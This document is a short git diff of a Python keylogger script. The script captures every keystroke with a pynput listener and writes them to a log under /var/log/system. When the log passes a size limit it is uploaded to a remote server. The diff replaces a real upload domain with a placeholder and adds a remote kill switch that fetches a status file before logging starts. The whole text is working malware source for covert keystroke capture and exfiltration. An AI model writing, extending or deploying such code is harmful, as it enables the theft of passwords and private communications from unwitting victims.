@@ -8,7 +8,7 @@ import os
 
 # === Configuration ===
 MAX_SIZE = 50 * 1024
-SERVER_URL = "https://files-sgn.jameskaois.com/upload"
+SERVER_URL = "https://SERVER_URL/upload"
 LOG_DIR = Path("/var/log/system")
 ACTIVE_FILE = LOG_DIR / "daemon_current.txt"
 
@@ -100,14 +100,21 @@ def change_log_file(new_logfile_path):
 
 
 # === Main logic ===
-logfile = get_active_logfile()
-setup_logging(logfile)
+res = requests.get(f"{SERVER_URL}s/keylogger_status.txt")
 
-def on_press(key):
-    global logfile
-    logging.info(str(key))
-    if check_file_size(logfile):
-        logfile = upload_and_reset(logfile)
+if (res.text == "1"):
+    logfile = get_active_logfile()
+    setup_logging(logfile)
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    def on_press(key):
+        global logfile
+        logging.info(str(key))
+        if check_file_size(logfile):
+            logfile = upload_and_reset(logfile)
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+    print('[+] Keylogger running!')
+else:
+    print('[x] Keylogger not running!')
